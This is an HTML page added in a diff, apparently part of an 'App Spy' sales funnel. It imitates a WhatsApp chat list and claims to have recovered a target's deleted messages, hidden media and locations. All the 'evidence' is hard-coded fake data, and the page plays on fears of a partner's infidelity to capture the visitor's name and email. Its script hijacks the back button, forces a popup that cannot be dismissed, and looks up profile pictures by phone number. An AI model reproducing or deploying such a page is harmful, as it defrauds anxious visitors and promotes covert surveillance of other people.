@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-46T459G961"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-46T459G961');
+</script>
+
+<!-- Script rastreador -->
+<script
+  src="https://cdn.skalame.com.br/scripts/utms/latest.js"
+  data-skalame-prevent-xcod-sck
+  data-skalame-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+  window.pixelId = "69c69f3ce78656ea3823d1f1";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script>
+  window.pixelId = "pc_oFPxkkRPcuXjW7EXGEP2u71dCPuxANnMBJVxz9Zc";
+  window.skalameApiBaseUrl = "https://skalame.vegacheckout.com.br";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://skalame.vegacheckout.com.br/scripts/pixel.js?v=" + Date.now());
+  document.head.appendChild(a);
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>App Spy — Conversations</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','2163220407447907');fbq('track','PageView');</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2163220407447907&ev=PageView&noscript=1"/></noscript>
+<script>
+// Query forwarding helper
+function buildForwardUrl(targetUrl, params) {
+  var url = new URL(targetUrl, window.location.href);
+  var currentParams = new URLSearchParams(window.location.search);
+  currentParams.forEach(function(value, key) {
+    if (!url.searchParams.has(key)) url.searchParams.set(key, value);
+  });
+  if (params) {
+    Object.keys(params).forEach(function(key) {
+      var value = params[key];
+      if (value !== undefined && value !== null && value !== '') url.searchParams.set(key, value);
+    });
+  }
+  return url.toString();
+}
+function navigateWithQuery(targetUrl, params) {
+  window.location.href = buildForwardUrl(targetUrl, params);
+}
+// End query forwarding helper
+</script>
+<script>(function(){function b(){history.pushState(null,null,location.href);}setTimeout(b,0);setTimeout(b,100);window.onpopstate=function(){navigateWithQuery("backredirect.html");};}());</script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{--g:#25D366;--gd:#128C7E;--bg:#f0f2f5;--w:#fff;--t:#111b21;--t2:#667781;--bd:#e9edef;--red:#ef4444;--green-msg:#dcf8c6;}
+html,body{font-family:'Inter',sans-serif;background:var(--bg);height:100%;overflow-x:hidden;}
+
+/* ── Full-viewport app ── */
+#app{width:100%;min-height:100vh;background:var(--bg);display:flex;flex-direction:column;}
+
+/* Status bar */
+.sb{height:26px;background:var(--w);display:flex;align-items:center;justify-content:space-between;padding:0 .9rem;border-bottom:1px solid var(--bd);}
+.sb-t{font-size:.72rem;font-weight:700;color:var(--t);}
+.sb-i{display:flex;align-items:center;gap:.35rem;}
+.sb-i svg{width:13px;height:13px;stroke:var(--t);fill:none;stroke-width:2;}
+
+/* Alert banner */
+.alert-bar{background:#fef2f2;border-left:3px solid var(--red);padding:.6rem .9rem;display:flex;align-items:center;gap:.7rem;cursor:pointer;}
+.ab-dot{width:28px;height:28px;border-radius:50%;background:var(--red);display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.ab-dot svg{width:14px;height:14px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;}
+.ab-body{flex:1;}
+.ab-title{font-size:.78rem;font-weight:700;color:var(--red);}
+.ab-sub{font-size:.7rem;color:var(--t2);}
+.ab-btn{font-size:.68rem;font-weight:700;color:#fff;background:var(--red);border:none;border-radius:5px;padding:.25rem .55rem;cursor:pointer;white-space:nowrap;flex-shrink:0;}
+
+/* Top bar */
+.top-bar{background:var(--w);border-bottom:1px solid var(--bd);padding:.75rem .9rem;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:20;}
+.tb-left{display:flex;align-items:center;gap:.6rem;}
+.tb-back svg{width:20px;height:20px;stroke:var(--t2);fill:none;stroke-width:2;stroke-linecap:round;}
+.tb-title{font-size:1.05rem;font-weight:800;color:var(--t);}
+.tb-right{display:flex;gap:.75rem;}
+.tb-right svg{width:20px;height:20px;stroke:var(--t2);fill:none;stroke-width:2;stroke-linecap:round;}
+
+/* Search bar */
+.search-bar{background:var(--w);padding:.45rem .9rem .6rem;border-bottom:1px solid var(--bd);}
+.search-inner{background:var(--bg);border-radius:8px;padding:.42rem .85rem;display:flex;align-items:center;gap:.5rem;}
+.search-inner svg{width:14px;height:14px;stroke:var(--t2);fill:none;stroke-width:2;flex-shrink:0;}
+.search-inner span{font-size:.82rem;color:var(--t2);}
+
+/* Suspicion bar */
+.susp-bar{background:var(--w);padding:.65rem .9rem;border-bottom:1px solid #fecaca;background:#fff8f8;}
+.susp-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:.3rem;}
+.susp-lbl{font-size:.7rem;font-weight:700;color:var(--t2);text-transform:uppercase;letter-spacing:.07em;}
+.susp-pct{font-size:.82rem;font-weight:800;color:var(--red);}
+.susp-track{height:6px;background:var(--bd);border-radius:10px;overflow:hidden;}
+.susp-fill{height:100%;background:linear-gradient(90deg,#f59e0b,var(--red));border-radius:10px;width:0%;transition:width 1.5s cubic-bezier(.4,0,.2,1);}
+.susp-items{display:flex;flex-wrap:wrap;gap:.35rem;margin-top:.45rem;}
+.si-chip{font-size:.67rem;color:var(--t2);background:var(--bg);border-radius:4px;padding:.15rem .45rem;}
+.si-chip span{color:var(--red);font-weight:700;}
+
+/* Filter tabs */
+.tabs{display:flex;background:var(--w);border-bottom:1px solid var(--bd);padding:0 .9rem;gap:1.4rem;}
+.tab{font-size:.82rem;font-weight:600;color:var(--t2);padding:.65rem 0;border-bottom:2.5px solid transparent;cursor:pointer;white-space:nowrap;}
+.tab.on{color:var(--gd);border-color:var(--g);}
+
+/* Filter banner */
+.filter-info{background:#fff8f8;padding:.5rem .9rem;font-size:.73rem;color:var(--t2);border-bottom:1px solid #fecaca;}
+.filter-info strong{color:var(--red);}
+
+/* Chat list */
+.chat-list{background:var(--w);flex:1;}
+
+/* Chat item */
+.ci{display:flex;align-items:center;gap:.8rem;padding:.75rem .9rem;border-bottom:1px solid var(--bd);cursor:pointer;transition:background .15s;position:relative;}
+.ci:hover,.ci:active{background:#fafafa;}
+.ci.hl{background:#fff5f5;border-left:3px solid var(--red);padding-left:calc(.9rem - 3px);}
+
+.ci-av{width:46px;height:46px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:1.2rem;overflow:hidden;position:relative;}
+.ci-av img{width:100%;height:100%;object-fit:cover;}
+.ci-av-ring{position:absolute;inset:0;border-radius:50%;border:2px solid var(--bd);}
+
+.ci-body{flex:1;min-width:0;}
+.ci-row1{display:flex;justify-content:space-between;align-items:center;margin-bottom:.22rem;}
+.ci-name{font-size:.88rem;font-weight:700;color:var(--t);filter:blur(3.5px);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:180px;}
+.ci-time{font-size:.7rem;color:var(--t2);white-space:nowrap;flex-shrink:0;margin-left:.35rem;}
+.ci-row2{display:flex;justify-content:space-between;align-items:center;gap:.4rem;}
+.ci-msg{font-size:.76rem;color:var(--t2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;filter:blur(3.5px);flex:1;}
+.ci-right{display:flex;align-items:center;gap:.3rem;flex-shrink:0;}
+.tag{font-size:.58rem;font-weight:700;border-radius:3px;padding:.14rem .38rem;white-space:nowrap;}
+.tg-del{background:#fee2e2;color:var(--red);border:1px solid #fecaca;}
+.tg-sus{background:#fff0f0;color:var(--red);border:1px solid #fecaca;}
+.tg-ev{background:#fef3c7;color:#92400e;border:1px solid #fde68a;}
+.ci-badge{width:17px;height:17px;border-radius:50%;background:var(--g);color:#fff;font-size:.58rem;font-weight:700;display:flex;align-items:center;justify-content:center;}
+.ci-badge.red{background:var(--red);}
+.ci-badge.gray{background:var(--t2);}
+
+/* Section headers */
+.sec-banner{background:#fff5f5;border-left:3px solid var(--red);padding:.6rem .9rem;display:flex;align-items:center;justify-content:space-between;cursor:pointer;}
+.sb-txt{font-size:.76rem;color:var(--t);flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.sb-txt strong{font-weight:700;}
+.sb-act{font-size:.7rem;font-weight:700;color:var(--red);white-space:nowrap;margin-left:.6rem;flex-shrink:0;}
+
+.mfc-row{background:#f0fdf4;border-left:3px solid var(--g);padding:.65rem .9rem;display:flex;align-items:center;gap:.75rem;cursor:pointer;}
+.mfc-av{width:34px;height:34px;border-radius:50%;background:var(--g);display:flex;align-items:center;justify-content:center;font-size:.85rem;flex-shrink:0;}
+.mfc-info{flex:1;min-width:0;}
+.mfc-name{font-size:.8rem;font-weight:700;color:var(--gd);filter:blur(3px);white-space:nowrap;}
+.mfc-sub{font-size:.7rem;color:var(--t2);}
+.mfc-arr{font-size:.7rem;font-weight:700;color:var(--g);white-space:nowrap;flex-shrink:0;}
+
+
+
+  /* 2-step popup */
+  .pop-overlay{position:fixed;inset:0;z-index:999;background:rgba(0,0,0,.55);backdrop-filter:blur(5px);display:flex;align-items:center;justify-content:center;padding:1rem;animation:fi .3s ease both;}
+  @keyframes fi{from{opacity:0}to{opacity:1}}
+  .pop{background:var(--w);border-radius:22px;padding:1.8rem 1.4rem 1.6rem;width:100%;max-width:360px;text-align:center;animation:su .4s cubic-bezier(.34,1.56,.64,1) both;box-shadow:0 20px 60px rgba(0,0,0,.25);}
+  @keyframes su{from{transform:scale(.88);opacity:0}to{transform:scale(1);opacity:1}}
+  .pop-lock{width:58px;height:58px;border-radius:50%;background:linear-gradient(135deg,var(--g),#22c55e);display:flex;align-items:center;justify-content:center;margin:0 auto 1rem;box-shadow:0 8px 24px rgba(37,211,102,.35);}
+  .pop-lock svg{width:26px;height:26px;stroke:#fff;fill:none;stroke-width:2.5;stroke-linecap:round;}
+  .pop-title{font-size:1.15rem;font-weight:800;color:var(--t);margin-bottom:.4rem;}
+  .pop-desc{font-size:.86rem;color:var(--t2);line-height:1.6;margin-bottom:1rem;}
+  .pop-desc strong{color:var(--red);font-weight:700;}
+  /* Step 1: data box */
+  .pop-data-box{background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;padding:.85rem 1rem;margin-bottom:1rem;text-align:center;}
+  .pop-data-title{font-size:.72rem;font-weight:700;color:var(--t2);margin-bottom:.6rem;display:flex;align-items:center;justify-content:center;gap:.35rem;}
+  .pop-data-grid{display:grid;grid-template-columns:1fr 1fr;gap:.35rem;}
+  .pop-data-item{display:flex;align-items:center;gap:.35rem;font-size:.78rem;color:var(--t);}
+  .pop-data-item span:first-child{font-size:.85rem;}
+  .pop-data-val{font-weight:700;color:var(--t2);margin-right:.15rem;}
+  /* Step 2: form */
+  .pop-logged{background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:.75rem 1rem;margin-bottom:.85rem;text-align:left;}
+  .pop-logged-lbl{font-size:.7rem;color:var(--t2);margin-bottom:.25rem;}
+  .pop-logged-val{font-size:.82rem;font-weight:600;color:var(--gd);}
+  .pop-field{margin-bottom:.65rem;text-align:left;}
+  .pop-field label{display:block;font-size:.76rem;font-weight:600;color:var(--t);margin-bottom:.3rem;}
+  .pop-field input{width:100%;background:var(--bg);border:1.5px solid var(--bd);border-radius:10px;padding:.75rem .9rem;color:var(--t);font-family:'Inter',sans-serif;font-size:.9rem;outline:none;transition:border-color .2s;}
+  .pop-field input:focus{border-color:var(--g);background:#fff;}
+  .pop-field input.err{border-color:var(--red);}
+  .pop-notice{background:#f0fdf4;border-radius:8px;padding:.6rem .85rem;font-size:.72rem;color:var(--gd);line-height:1.55;margin-bottom:.85rem;text-align:left;}
+  .pop-notice strong{color:var(--red);}
+  .pop-btn{width:100%;padding:1rem;background:linear-gradient(135deg,var(--g),#22c55e);border:none;border-radius:12px;font-family:'Inter',sans-serif;font-size:1rem;font-weight:800;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:.6rem;box-shadow:0 4px 24px rgba(37,211,102,.35);animation:bp 2s infinite;margin-bottom:.5rem;}
+  @keyframes bp{0%,100%{box-shadow:0 4px 24px rgba(37,211,102,.3)}50%{box-shadow:0 6px 36px rgba(37,211,102,.55)}}
+  .pop-btn svg{width:17px;height:17px;stroke:#fff;fill:none;stroke-width:2.5;stroke-linecap:round;}
+  .pop-btn-sub{font-size:.7rem;opacity:.8;font-weight:400;}
+
+</style>
+</head>
+<body>
+<div id="app">
+  <!-- Status bar -->
+  <div class="sb">
+    <span class="sb-t" id="s-time">09:07</span>
+    <div class="sb-i">
+      <svg viewBox="0 0 24 24"><path d="M1.42 9a16 16 0 0121.16 0M5 12.55a11 11 0 0114.08 0M10.71 17L12 18.29 13.29 17a4 4 0 00-5.66 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
+      <svg viewBox="0 0 24 24"><rect x="2" y="7" width="18" height="10" rx="2"/><path d="M22 11v2"/></svg>
+    </div>
+  </div>
+
+  <!-- Alert banner -->
+  <div class="alert-bar" onclick="showPopup()">
+    <div class="ab-dot"><svg viewBox="0 0 24 24"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/></svg></div>
+    <div class="ab-body">
+      <div class="ab-title">🔴 <span id="ban-n">343</span> deleted messages recovered!</div>
+      <div class="ab-sub">Conversations deleted to hide something from you</div>
+    </div>
+    <button class="ab-btn">UNLOCK</button>
+  </div>
+
+  <!-- Top bar -->
+  <div class="top-bar">
+    <div class="tb-left">
+      <div class="tb-back"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></div>
+      <div class="tb-title">Chats</div>
+    </div>
+    <div class="tb-right">
+      <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1"/><circle cx="12" cy="12" r="1"/><circle cx="12" cy="19" r="1"/></svg>
+    </div>
+  </div>
+
+  <!-- Search -->
+  <div class="search-bar">
+    <div class="search-inner">
+      <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      <span>Ask Meta AI or Search</span>
+    </div>
+  </div>
+
+  <!-- Suspicion bar -->
+  <div class="susp-bar">
+    <div class="susp-top">
+      <div class="susp-lbl">⚠ Suspicion Index</div>
+      <div class="susp-pct" id="spct">0%</div>
+    </div>
+    <div class="susp-track"><div class="susp-fill" id="sfill"></div></div>
+    <div class="susp-items">
+      <div class="si-chip">Late-night msgs <span id="sc1">0</span> found</div>
+      <div class="si-chip">Deleted convos <span id="sc2">0</span> recovered</div>
+      <div class="si-chip">Hidden media <span id="sc3">0</span> detected</div>
+      <div class="si-chip">Locations <span id="sc4">0</span> tracked</div>
+      <div class="si-chip">Unknown contacts <span id="sc5">0</span> detected</div>
+    </div>
+  </div>
+
+  <!-- Tabs -->
+  <div class="tabs">
+    <div class="tab on">All</div>
+    <div class="tab">Unread</div>
+    <div class="tab">Favorites</div>
+    <div class="tab">Groups</div>
+  </div>
+
+  <!-- Filter info -->
+  <div class="filter-info">
+    Showing conversations with <strong>suspicious activity</strong> detected. 205 normal conversations filtered out.
+  </div>
+
+  <!-- Chat list -->
+  <div class="chat-list" id="chat-list"></div>
+</div>
+
+<div class="pop-overlay" id="popup" style="display:none;">
+  <div class="pop" id="pop-inner" onclick="event.stopPropagation()">
+
+    <!-- STEP 1: Data recovered + button -->
+    <div id="pop-step1">
+      <div class="pop-lock"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></div>
+      <div class="pop-title">Blocked Conversation</div>
+      <div class="pop-desc">This conversation is <strong>locked.</strong> Unlock to see the full content.</div>
+      <div class="pop-data-box">
+        <div class="pop-data-title">📊 Data recovered from this number:</div>
+        <div class="pop-data-grid">
+          <div class="pop-data-item"><span>💬</span><span class="pop-data-val">295</span><span>deleted msgs</span></div>
+          <div class="pop-data-item"><span>🖼️</span><span class="pop-data-val">82</span><span>hidden media</span></div>
+          <div class="pop-data-item"><span>👤</span><span class="pop-data-val">8</span><span>secret contacts</span></div>
+          <div class="pop-data-item"><span>🌙</span><span class="pop-data-val">30</span><span>late night chats</span></div>
+        </div>
+      </div>
+      <button class="pop-btn" onclick="goStep2Popup()">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+        🔓 Unlock Conversations <span id="pop-phone-display"></span>
+      </button>
+    </div>
+
+    <!-- STEP 2: Lead capture form -->
+    <div id="pop-step2" style="display:none;">
+      <div class="pop-lock"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></div>
+      <div class="pop-title">Blocked Conversation</div>
+      <div class="pop-desc">This conversation is <strong>locked.</strong> Unlock to see the full content.</div>
+      <div class="pop-logged">
+        <div class="pop-logged-lbl">Logged in as:</div>
+        <div class="pop-logged-val" id="pop-logged-name">Enter your name below</div>
+        <div class="pop-logged-val" style="font-size:.76rem;font-weight:400;" id="pop-logged-email">your@email.com</div>
+      </div>
+      <div class="pop-field"><label>Your name</label><input type="text" id="pop-name" placeholder="Full name" autocomplete="name" oninput="updateLoggedIn()"/></div>
+      <div class="pop-field"><label>Your email</label><input type="email" id="pop-email" placeholder="your@email.com" autocomplete="email" oninput="updateLoggedIn()"/></div>
+      <div class="pop-notice">📱 You will receive all <strong>conversations, photos, videos, and locations</strong> recovered at your email and WhatsApp, plus full access to the <strong>App Spy</strong> app.</div>
+      <button class="pop-btn" onclick="submitLead()">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+        🔓 Unlock All Conversations
+      </button>
+    </div>
+
+  </div>
+</div>
+
+</div>
+
+<script>
+var up=new URLSearchParams(window.location.search);
+var phone=up.get('phone')||sessionStorage.getItem('sl_phone')||'';
+var dec=phone?decodeURIComponent(phone):'';
+
+// Clock
+function tick(){var d=new Date();document.getElementById('s-time').textContent=String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0');}
+tick();setInterval(tick,30000);
+
+// Chat data - long realistic list
+var chats=[
+  {n:'Car***,***',m:'I miss you so much ●●●●●●●●●●●',t:'now',tags:['sus'],b:'!',br:true,hl:true,e:'💌'},
+  {n:'Luc***,***',m:"Don't tell ●●●● about ●●●●●●●●●●●",t:'16:30',tags:['del','sus'],b:'2'},
+  {n:'+55 ●●● ●●●●-●●●●',m:'●●●●●●●●●● ●●●●●● ●●●●',t:'00:45',tags:['del'],b:'2',br:true},
+  {n:'Mar***',m:'●●●● ●●●●●●●● ●●●● ●●●●●●',t:'02:05',tags:['del'],b:'4',br:true},
+  {n:'And***',m:'●●●●●●●●●● ●●● ●●●●',t:'02:34',tags:['ev'],b:''},
+  {n:'Val*** (***',m:'●●●●●●●●● ●●●●●●●●●●●',t:'01:22',tags:['del'],b:'3',br:true},
+  {n:'Isa***',m:'Hey babe ●●●●●●●●●',t:'08:30',tags:['sus'],b:'',e:'😘'},
+  {n:'Mig●●●● Ol●●●●',m:'●●●●● ●●●●●●● ●●●●● ●●●●●',t:'23:45',tags:['del','sus'],b:''},
+  {n:'Lui●●●● Ol●●●',m:'●●●●●●● ●●●●● ●●●●●●●●●●',t:'01:33',tags:['del'],b:''},
+  {n:'+55 ●●●●● ●●●●●●',m:'●●●●● ●●●● ●●●●●●●●',t:'23:56',tags:['sus'],b:''},
+  {n:'Car●●●●● M●●●●',m:'●●●●●●● ●●●●●● ●●●●●●●●',t:'09:19',tags:['ev'],b:'',e:'📸'},
+  {n:'Mar●●●●● S●●●',m:'●●●● ●●●●●●●● ●●●●●●●●●●●',t:'10:45',tags:['del'],b:'1'},
+  {n:'+55 ●●● ●●●●●●●●',m:'●●●●●●●●●●● ●●●●●● ●●●●',t:'01:22',tags:['del','sus'],b:''},
+  {n:'Jos●●●● S●●●●',m:'●●●●● ●●● ●●●●●●●●●●',t:'08:30',tags:[''],b:''},
+  {n:'Sof●● M●●●',m:'●●●●● ●●●●●●●●●●●●●',t:'16:41',tags:['sus'],b:'',e:'💋'},
+  {n:'Dan●●●● L●●●',m:'●●●●● ●●● ●●●●●● ●●●●●●',t:'14:30',tags:['del'],b:''},
+  {n:'Ale●●●● C●●●●●',m:'●●●● ●●●●●●● ●●● ●●●●●●●●●',t:'03:45',tags:['del','sus'],b:'2',br:true},
+  {n:'Car●●●● F●●●●',m:'●●●●● ●●●●●●●● ●●●●●●● ●●●',t:'03:50',tags:['del'],b:''},
+  {n:'Ana● R●●●●●',m:'●●●●● ●●●●●●●',t:'10:10',tags:['sus'],b:'1'},
+  {n:'+44 ●●●-●●●-●●●●7',m:'●●●● ●●●●●●● ●●●●●●●●●',t:'02:12',tags:['del','ev'],b:'3',br:true},
+  {n:'Rec●●●● C●●●●●',m:'●●●●● ●●●●●●●●●●●●',t:'23:40',tags:['del'],b:''},
+  {n:'Con●●●● F●●●●',m:'●●●●●●●●●●● ●●● ●●●●',t:'01:05',tags:['sus'],b:''},
+  {n:'Bru●●● L●●●',m:'●●●● ●●●●●●●',t:'04:20',tags:['del','sus'],b:'1',br:true},
+  {n:'Lei***,***',m:'●●●●●●●● ●●● ●●●●●●●●●●●',t:'03:10',tags:['del'],b:''},
+  {n:'Día***,***',m:'●●●●● ●●●●●●●●●●',t:'00:33',tags:['sus'],b:'2'},
+  {n:'Jos***',m:'●●●●●●● ●●●●● ●●●●●',t:'22:55',tags:['del'],b:''},
+  {n:'Jul***',m:'●●●●●●●●● ●●●●●●●●●●●',t:'01:17',tags:['sus','ev'],b:'4',br:true},
+];
+
+var tagMap={del:{cls:'tg-del',txt:'DELETED'},sus:{cls:'tg-sus',txt:'SUSPICIOUS'},ev:{cls:'tg-ev',txt:'EVIDENCE'}};
+var colors=['#4f46e5','#7c3aed','#db2777','#059669','#d97706','#0284c7','#be123c','#0d9488','#7c2d12','#1d4ed8'];
+
+function renderChats(){
+  var list=document.getElementById('chat-list');
+  chats.forEach(function(c,i){
+    // Insert section banners at specific points
+    if(i===1){
+      var sb=document.createElement('div');
+      sb.className='sec-banner';
+      sb.onclick=function(){showPopup();};
+      sb.innerHTML='<span class="sb-txt"><strong>Car***, don\'t tell</strong> ●●●●● that we ●●●●●●●● yesterday at the ●●●●●●● ●●●●●</span><span class="sb-act">→ Tap to unlock full message</span>';
+      list.appendChild(sb);
+    }
+    if(i===8){
+      var mfc=document.createElement('div');
+      mfc.className='mfc-row';
+      mfc.onclick=function(){showPopup();};
+      mfc.innerHTML='<div class="mfc-av">💚</div><div class="mfc-info"><div class="mfc-name">+55 ●●●●●-●●●●●</div><div class="mfc-sub">347 messages in the last 7 days • 93% at night</div></div><div class="mfc-arr">UNLOCK →</div>';
+      list.appendChild(mfc);
+    }
+    if(i===15){
+      var sb2=document.createElement('div');
+      sb2.className='sec-banner';
+      sb2.onclick=function(){showPopup();};
+      sb2.innerHTML='<span class="sb-txt">"I miss you so much, when can I ●●●●●● again? Just think ●●●●●●●●"</span><span class="sb-act">→ Tap to unlock full message</span>';
+      list.appendChild(sb2);
+    }
+
+    var d=document.createElement('div');
+    d.className='ci'+(c.hl?' hl':'');
+    d.onclick=function(){showPopup();};
+
+    var bgColor=colors[i%colors.length];
+    var emo=c.e||'';
+
+    var tagsHtml=c.tags.map(function(t){
+      if(!t||!tagMap[t])return '';
+      return '<span class="tag '+tagMap[t].cls+'">'+tagMap[t].txt+'</span>';
+    }).join('');
+
+    var badgeHtml='';
+    if(c.b)badgeHtml='<div class="ci-badge'+(c.br?' red':'')+'">'+c.b+'</div>';
+
+    d.innerHTML=
+      '<div class="ci-av" style="background:'+bgColor+'20;"><div class="ci-av-ring"></div>'+(emo?'<span style="font-size:1.2rem;">'+emo+'</span>':'<span style="font-size:.7rem;font-weight:700;color:'+bgColor+';">●</span>')+'</div>'+
+      '<div class="ci-body">'+
+        '<div class="ci-row1"><span class="ci-name">'+c.n+'</span><span class="ci-time">'+c.t+'</span></div>'+
+        '<div class="ci-row2"><span class="ci-msg">'+c.m+'</span><div class="ci-right">'+tagsHtml+badgeHtml+'</div></div>'+
+      '</div>';
+    list.appendChild(d);
+  });
+}
+
+// Animations on load
+setTimeout(function(){
+  document.getElementById('sfill').style.width='97%';
+  var n=0;var t=setInterval(function(){n=Math.min(n+2,97);document.getElementById('spct').textContent=n+'%';if(n>=97)clearInterval(t);},25);
+  function ac(id,to,dur){var el=document.getElementById(id),s=performance.now();function f(now){var t=Math.min((now-s)/dur,1);el.textContent=Math.round(to*t);if(t<1)requestAnimationFrame(f);}requestAnimationFrame(f);}
+  ac('sc1',28,1000);ac('sc2',41,1200);ac('sc3',24,1100);ac('sc4',30,1300);ac('sc5',44,1500);
+},600);
+
+// Show popup after 8 seconds
+setTimeout(showPopup,8000);
+
+// Show popup on scroll
+var _scrollFired = false;
+window.addEventListener('scroll', function() {
+  if (_scrollFired) return;
+  if (window.scrollY > 300) {
+    _scrollFired = true;
+    showPopup();
+  }
+}, {passive: true});
+
+
+function showPopup(){
+  var p=document.getElementById('popup');
+  p.style.display='flex';
+  document.getElementById('p1').textContent='343';
+  document.getElementById('p2').textContent='73';
+  document.getElementById('p3').textContent='18';
+  document.getElementById('p4').textContent='89';
+}
+function closePopup(){document.getElementById('popup').style.display='none';}
+
+
+
+renderChats();
+
+
+
+
+// ── 2-step popup logic ──
+var _popStep = 1;
+var _popReshowTimer = null;
+
+function showPopup() {
+  _popStep = 1;
+  document.getElementById('pop-step1').style.display = 'block';
+  document.getElementById('pop-step2').style.display = 'none';
+  var pop = document.getElementById('popup');
+  pop.style.display = 'flex';
+  // Step 1: clicking outside closes it
+  pop.onclick = function() { closePopup(); };
+  // Set phone in button
+  var ph = sessionStorage.getItem('sl_phone') || dec || '';
+  var el = document.getElementById('pop-phone-display');
+  if (el && ph) el.textContent = ph;
+}
+
+function closePopup() {
+  if (_popStep === 2) return; // step2 is NOT dismissible
+  document.getElementById('popup').style.display = 'none';
+  // Reshow after 6 seconds
+  clearTimeout(_popReshowTimer);
+  _popReshowTimer = setTimeout(function() { showPopup(); }, 6000);
+}
+
+function goStep2Popup() {
+  _popStep = 2;
+  document.getElementById('pop-step1').style.display = 'none';
+  document.getElementById('pop-step2').style.display = 'block';
+  // Step 2: clicking outside does NOTHING
+  document.getElementById('popup').onclick = function(e) { e.stopPropagation(); };
+}
+
+function updateLoggedIn() {
+  var n = document.getElementById('pop-name').value.trim();
+  var e = document.getElementById('pop-email').value.trim();
+  if (n) document.getElementById('pop-logged-name').textContent = n;
+  if (e) document.getElementById('pop-logged-email').textContent = e;
+}
+
+function submitLead() {
+  var nameEl  = document.getElementById('pop-name');
+  var emailEl = document.getElementById('pop-email');
+  var nameOk  = nameEl.value.trim().length > 0;
+  var emailOk = emailEl.value.trim().length > 0 && emailEl.value.includes('@');
+  nameEl.classList.toggle('err', !nameOk);
+  emailEl.classList.toggle('err', !emailOk);
+  if (!nameOk || !emailOk) return;
+  sessionStorage.setItem('buyer_name',  nameEl.value.trim());
+  sessionStorage.setItem('buyer_email', emailEl.value.trim());
+  var btn = document.querySelector('#pop-step2 .pop-btn');
+  if (btn) { btn.textContent = 'Unlocking...'; btn.disabled = true; }
+  clearTimeout(_popReshowTimer);
+  setTimeout(function() {
+    var ph = sessionStorage.getItem('sl_phone') || dec || '';
+    navigateWithQuery('step6.html', {phone: ph});
+  }, 800);
+}
+
+
+function loadProfilePic(phone, containerEl, size) {
+  if (!phone || !containerEl) return;
+  var apiUrl = 'https://newtechaccess.com/profile-picture.php?phone=' + encodeURIComponent(phone);
+  fetch(apiUrl)
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (data && data.urlImage) {
+        var proxied = 'https://newtechaccess.com/image-proxy.php?url=' + encodeURIComponent(data.urlImage);
+        var wrapper = document.createElement('div');
+        wrapper.style.cssText = 'width:'+size+'px;height:'+size+'px;border-radius:50%;background-size:cover;background-position:center;border:3px solid var(--g);box-sizing:border-box;flex-shrink:0;';
+        wrapper.style.backgroundImage = 'url('+proxied+')';
+        if (containerEl.parentNode) containerEl.parentNode.replaceChild(wrapper, containerEl);
+      }
+    })
+    .catch(function(){});
+}
+
+</script>
+</body>
+</html>
